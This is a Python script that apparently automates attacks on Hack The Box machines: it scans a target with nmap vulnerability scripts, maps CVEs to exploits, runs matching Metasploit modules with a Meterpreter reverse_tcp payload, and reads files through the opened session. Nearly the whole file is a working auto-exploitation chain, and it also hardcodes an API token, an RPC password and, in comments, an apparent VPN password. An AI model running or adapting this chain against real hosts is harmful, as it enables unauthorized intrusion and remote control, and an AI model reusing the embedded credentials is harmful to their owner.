import os, json, argparse, requests, time, csv, re
import libtmux, htb, nmap
from box import Box
import pandas as pd
import cve_searchsploit as CS
import getsploit
import pyperclip
import pymetasploit3
from pymetasploit3 import *
from pymetasploit3.msfrpc import MsfRpcClient

parser = argparse.ArgumentParser(description='What box do you want to pwn?')
parser.add_argument('--box', required=True)
name = parser.parse_args()
api = htb.HTB('OwBnueBa1zprFdqbWRQnNiXpyr0T1lIkZFQrwGUK0xnjD4Rs3yQxuUEGlHec')
BASE_URL = 'https://www.hackthebox.eu/api'
listOfBoxes = []
cveList = []
exploitList = []
#print(a.get_machine(7))
#print(type(a.get_machine(7)))
#list = a.get_machine(7).get("ip")
#print(list)

def initBoxes():
    rawBoxes = api.get_machines()
    for rawBox in rawBoxes:
        listOfBoxes.append(Box(rawBox))

def printAllBoxes():
    for box in listOfBoxes:
        print(box.__repr__())
    #print(all)
    #print(*all, sep='\n')

        #print(el)
        #print(el.get("name"))
        #print(el["ip"])

    #formatlist = str(a.get_machines()).strip('[]')
    #print(type(formatlist))
    #formatlist = formatlist.replace("'", "\"")
    #res = json.loads(formatlist)
    #print(res)
    #list = res.get("name")

def getBoxIP(name: str) -> str:
    for box in listOfBoxes:
        if box.name == name.box:
            print(box.ip)
            return box.ip

def getBoxID(name: str) -> str:
    for box in listOfBoxes:
        if box.name == name.box:
            print(box.id)
            return box.id

def getBoxOS(name: str) -> str:
    for box in listOfBoxes:
        if box.name == name.box:
            print(box.os)
            return box.os

def auth(path: str) -> str:
        """
        Helper function to generate an authenticated URL
        :params self: HTB object in use
        :params path: string containing path to query
        :returns: path to authenticated query
        """
        print("{}?api_token={}".format(path, api.api_key))
        return "{}?api_token={}".format(path, api.api_key)


def controlBox(name: str, action: str):
    mid = getBoxID(name)
    print(mid)
    r = requests.post(BASE_URL + auth('/vm/vip/{}/{}'.format(action, mid)), headers=api.headers).json()
    if r["success"] != 1:
        print("Error:" + (r["status"]))

def getCVEsFromNmap():
    cveList = []
    with open(name.box + ".nmap", newline='') as nmapfile:
        cves=[]
        lines = nmapfile.read().splitlines()
        for line in lines:
            cves = re.findall(r'CVE-\w+-\w+', line)
            for cve in cves:
                cveList.append(cve)
    return cveList

def searchExploits(cveList):
    exploitList = []
    print(cveList)
    for cve in cveList:
        print(cve)
        print(CS.edbid_from_cve(cve))
        for i in CS.edbid_from_cve(cve):
            os.system("searchsploit -p " + str(i))
            exploitList.append(pyperclip.paste())
            time.sleep(5)
    return exploitList

def runNmap():
    nm = nmap.PortScanner()
    nm.scan(hosts=getBoxIP(name), arguments='-sC -sV -Pn')
    nm.scan(hosts=getBoxIP(name), arguments='--script nmap-vulners,vulscan --script-args vulscandb=scipvuldb.csv -sC -sV -Pn')
    print(nm.csv())
    print(nm.command_line())
    with open('nmapOutput.csv', 'w') as f:
       print(nm.csv(), file=f)
    # with open('nmapOutput.csv', 'w', newline='') as file:
    #     writer = csv.writer(file)
    #     writer.writerows(nm.csv())

def getExploitsFromMsf():
    exploitList = []
    with open(name.box + ".exploits", newline='') as exploitsfile:
        exploits=[]
        lines = exploitsfile.read().splitlines()
        for line in lines:
            exploits = re.findall(r'(?:exploit|auxiliary)\/\w+\/\w+\/\w+', line)
            for exploit in exploits:
                print(exploit)
                exploitList.append(exploit)
    return exploitList

def cleanTemporaryFiles():
    filePath = name.box + ".exploits"
    if os.path.exists(filePath):
        os.remove(filePath)

def windowsWorkflow():
    #Clean temporary files
    cleanTemporaryFiles()
    #Run nmap on machine
    runNmap()
    #Get CVEs
    cveList = getCVEsFromNmap()
    cveList = list(dict.fromkeys(cveList))
    print(cveList)
    #Search for exploits using searchsploit
    exploitList = searchExploits(cveList)
    print(exploitList)
    # Initialize msfconsole
    client = MsfRpcClient('NbxGWyuV', port=55552)
    #Search for exploits in msfconsole
    for cve in cveList:
        os.system('msfconsole -x "search "' + cve + ' >> ' + name.box + '.exploits&')
        time.sleep(15)
    #Extract them from file
    exploitList = getExploitsFromMsf()
    for exploit in exploitList:
        x = exploit.split("/")
        exploitType = x[0]
        exploitName = exploit.replace(exploitType + "/", "")
        #Select exploit
        exploit = client.modules.use(exploitType, exploitName)
        #Set targetx
        try:
            exploit['RHOSTS'] = getBoxIP(name)
        except KeyError:
            exploit['RHOST'] = getBoxIP(name)
        #Choose payload to use
        payload = client.modules.use('payload', 'windows/x64/meterpreter/reverse_tcp')
        #Set our IP
        payload['LHOST'] = 'tun0'
        #Run the exploit
        print("a")
        exploit.execute(payload=payload)
        time.sleep(20)
    print(client.sessions.list)
    #Interact with the newly opened session
    shell = client.sessions.session(list(client.sessions.list.keys())[0])
    shell.write('getuid')
    shell.read()
    print(shell.run_with_output('pwd'))
    print(shell.run_with_output('search -f user.txt'))
    print(shell.run_with_output('search -f root.txt'))
    #print(shell.run_with_output('cat \'C:\\Users\\Administrator\\Desktop\\root.txt\''))
    #print(shell.run_with_output('cat \'C:\\Users\\haris\\Desktop\\user.txt\''))

def linuxWorkflow():
    #Clean temporary files
    cleanTemporaryFiles()
    #Run nmap on machine
    runNmap()
    #Get CVEs
    cveList = getCVEsFromNmap()
    cveList = list(dict.fromkeys(cveList))
    print(cveList)
    #Search for exploits using searchsploit
    exploitList = searchExploits(cveList)
    print(exploitList)
    # Initialize msfconsole
    client = MsfRpcClient('NbxGWyuV', port=55552)
    #Search for exploits in msfconsole
    for cve in cveList:
        os.system('msfconsole -x "search "' + cve + ' >> ' + name.box + '.exploits&')
        time.sleep(15)
    #Extract them from file
    exploitList = getExploitsFromMsf()
    for exploit in exploitList:
        x = exploit.split("/")
        exploitType = x[0]
        exploitName = exploit.replace(exploitType + "/", "")
        #Select exploit
        exploit = client.modules.use(exploitType, exploitName)
        #Set targetx
        try:
            exploit['RHOSTS'] = getBoxIP(name)
        except KeyError:
            exploit['RHOST'] = getBoxIP(name)
        #Choose payload to use
        payload = client.modules.use('payload', 'windows/x64/meterpreter/reverse_tcp')
        #Set our IP
        payload['LHOST'] = 'tun0'
        #Run the exploit
        print("a")
        exploit.execute(payload=payload)
        time.sleep(20)
    print(client.sessions.list)
    #Interact with the newly opened session
    shell = client.sessions.session(list(client.sessions.list.keys())[0])
    shell.write('getuid')
    shell.read()
    print(shell.run_with_output('pwd'))
    print(shell.run_with_output('search -f user.txt'))
    print(shell.run_with_output('search -f root.txt'))
    #print(shell.run_with_output('cat \'C:\\Users\\Administrator\\Desktop\\root.txt\''))
    #print(shell.run_with_output('cat \'C:\\Users\\haris\\Desktop\\user.txt\''))


initBoxes()
#Switch to assign/remove box
controlBox(name, "assign")
#printAllBoxes()
if getBoxOS(name) == "Linux":
    linuxWorkflow()
elif getBoxOS(name) == "Windows":
    windowsWorkflow()


# productList = []
# with open('nmapOutput.csv', newline='') as csvfile:
#     spamreader = csv.reader(csvfile, delimiter=';', quotechar='|')
#     for row in spamreader:
#         print(', '.join(row))
#         if(row and row[7]):
#             print(row[7])
#             print("\n")
#             productList.append(row[7])
# for i in productList:
#     print(i)
#CS.edbid_from_cve("CVE-2019-0708")
    # for line in csvfile:
    #        csvfile.write(line.replace(';', ','))
    # df = pd.read_csv(csvfile)
    # column = df['product']
    # print(column)
# #Start HTB VPN on a window
# window.rename_window('vpn')
# paneVpn = window.split_window(attach=True)
# paneVpn.send_keys('openvpn DonDada.ovpn')
# time.sleep(5)
#paneVpn.send_keys('Menime1212!')
#time.sleep(10)
#Add a new window for nmap
# windowsNmap = session.new_window(attach=True, window_name="nmap")
# paneNmap = windowsNmap.split_window(attach=True)
# paneNmap.send_keys("nmap -sC -sV -oA " + name.box +" " + getBoxIP(name))
#Add a new window to search exploits in metasploit
# windowsNmap = session.new_window(attach=True, window_name="nmap")
# paneNmap = windowsNmap.split_window(attach=True)
# paneNmap.send_keys("nmap -sC -sV -oA " + name.box +" " + getBoxIP(name))
#CS.update_db()
#os.system("xfce4-terminal -e \'bash -c \"sudo openvpn /home/mnm/Documents/AutoPen/DonDada.ovpn; bash\"\'")
#Open a terminal with tmux
# os.system("xfce4-terminal -e \'bash -c \"tmux new-session -s sisc; bash\"\'")
# time.sleep(1)
# server = libtmux.Server()
# session = server.find_where({ "session_name": "sisc" })
# window = session.attached_window
# window.rename_window('nmap')
# paneVpn = window.attached_pane
# time.sleep(10)
# paneVpn.send_keys("nmap --script vuln -sC -sV -Pn -oA " + name.box +" " + getBoxIP(name))
# if 'CVE' in line:
#     print(line)
#paneVpn.send_keys("")
# print(exploitList)
# for exploit in exploitList:
#     print(exploit)
# with open("exploits.txt", newline='') as exploitfile:
#     exploits=[]
#     lines = exploitfile.read().splitlines()
#     for line in lines:
#         print(line)
#         exploits = re.findall(r'exploits/\w+/w+/$\w+', line)
#         for exploit in exploits:
#             print(exploit)
#print(client.modules.exploits)
#Add a new window to search exploits in metasploit
# windowsMSF = session.new_window(attach=True, window_name="msf")
# paneMSF = windowsMSF.split_window(attach=True)
# paneMSF.send_keys("msfconsole")
# time.sleep(5)

#!!!!!!TODO: use msfrpc library to get a console to search for an exploit
# exploitToUse = ""
# for cve in cveList:
#     print(cve)
#     print(CS.edbid_from_cve(cve))
#     for i in CS.edbid_from_cve(cve):
#         paneMSF.send_keys("search" + str(i))
#         #print(pyperclip.paste())
#         exploitToUse = pyperclip.paste()
#         time.sleep(5)
# print(exploitToUse)
#paneMSF.send_keys("load msgrpc Pass=Km9EcHcp")
# print(exploit.required)
# print(exploit.runoptions)
# print(exploit.references)
# print(exploit.targets)
# print(exploit.targetpayloads())
# print(payload.required)
# print(payload.runoptions)
    #shell.run_shell_cmd_with_output('pwd')
    #exploit['DisablePayloadHandler'] = False
